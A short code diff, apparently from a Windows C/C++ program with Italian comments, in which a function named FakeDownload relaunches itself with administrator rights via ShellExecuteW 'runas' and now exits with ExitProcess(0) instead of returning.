@@ -78,7 +78,9 @@ void FakeDownload() {
         wchar_t modulePath[MAX_PATH];
         GetModuleFileNameW(NULL, modulePath, MAX_PATH);
         ShellExecuteW(NULL, L"runas", modulePath, NULL, NULL, SW_SHOWNORMAL);
-        return; // Esci per consentire il riavvio con privilegi amministrativi
+
+        // Attendi che il programma venga riavviato con privilegi amministrativi
+        ExitProcess(0); // Termina il processo corrente per consentire il riavvio
     }
 
     srand((unsigned int)time(NULL));
